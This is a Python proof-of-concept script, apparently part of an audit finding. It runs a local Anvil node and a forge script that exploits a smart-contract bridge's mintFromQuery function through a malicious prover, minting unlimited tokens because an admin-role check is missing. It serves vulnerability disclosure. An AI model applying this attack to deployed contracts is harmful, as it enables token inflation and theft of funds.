#!/usr/bin/env python3
"""
PoC: MintableUSCBridge.mintFromQuery — Untrusted Prover → Unlimited Token Minting
Critical Finding — SpaceCoin CertIK SkyShield

Starts a local Anvil node, deploys ConcreteUSCBridge + MaliciousProver,
and runs the attack — no manual setup required.

Requirements:
  - Foundry installed (anvil + forge)  https://getfoundry.sh
  - CCNext-smart-contracts repo at ~/CCNext-smart-contracts  (already cloned)

Run:
  python3 poc_mintable_usc_bridge_unlimited_mint.py
"""

import subprocess
import sys
import time
import os
import signal
import re

REPO     = os.path.expanduser("~/CCNext-smart-contracts")
RPC      = "http://127.0.0.1:8545"
# anvil default account[0]
PRIV_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
ATTACKER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"

def check_tools():
    for tool in ("anvil", "forge"):
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            print(f"ERROR: '{tool}' not found. Install Foundry: https://getfoundry.sh")
            sys.exit(1)

def start_anvil():
    proc = subprocess.Popen(
        ["anvil", "--silent"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    # Wait until port is accepting connections
    import socket
    for _ in range(30):
        try:
            s = socket.create_connection(("127.0.0.1", 8545), timeout=1)
            s.close()
            return proc
        except OSError:
            time.sleep(0.5)
    print("ERROR: anvil did not start in time")
    proc.terminate()
    sys.exit(1)

def run_forge_script():
    result = subprocess.run(
        [
            "forge", "script",
            "script/PocUnlimitedMint.s.sol:PocUnlimitedMint",
            "--rpc-url", RPC,
            "--private-key", PRIV_KEY,
            "--broadcast",
            "-vv",
        ],
        cwd=REPO,
        capture_output=True,
        text=True,
    )
    return result

def main():
    check_tools()

    print("=" * 60)
    print("PoC: MintableUSCBridge — Unlimited Token Minting")
    print("=" * 60)
    print()

    print("[1/3] Starting local Anvil node...")
    anvil = start_anvil()
    print("      Anvil running at", RPC)
    print()

    try:
        print("[2/3] Running forge script (deploy + attack)...")
        print()
        result = run_forge_script()

        # Print script logs
        output = result.stdout + result.stderr
        for line in output.splitlines():
            stripped = line.strip()
            # Show deploy/attack/result log lines
            if any(tag in stripped for tag in (
                "[deploy]", "[pre]", "[call1]", "[call2]",
                "=== ATTACK", "Attacker", "Total supply", "Root cause", "Fix:"
            )):
                print(" ", stripped)

        print()
        if result.returncode == 0:
            print("[3/3] RESULT: forge script exited successfully")
            print()
            print("VULNERABILITY CONFIRMED:")
            print("  mintFromQuery(maliciousProver, freshQueryId) mints unlimited tokens.")
            print("  Repeated calls with different queryIds inflate supply without bound.")
            print()
            print("Missing check (present in UniversalBridgeProxy, absent in MintableUSCBridge):")
            print("  require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))")
        else:
            print("[3/3] forge script FAILED. Full output:")
            print(output)

    finally:
        anvil.terminate()
        anvil.wait()
        print()
        print("Anvil stopped.")

if __name__ == "__main__":
    main()
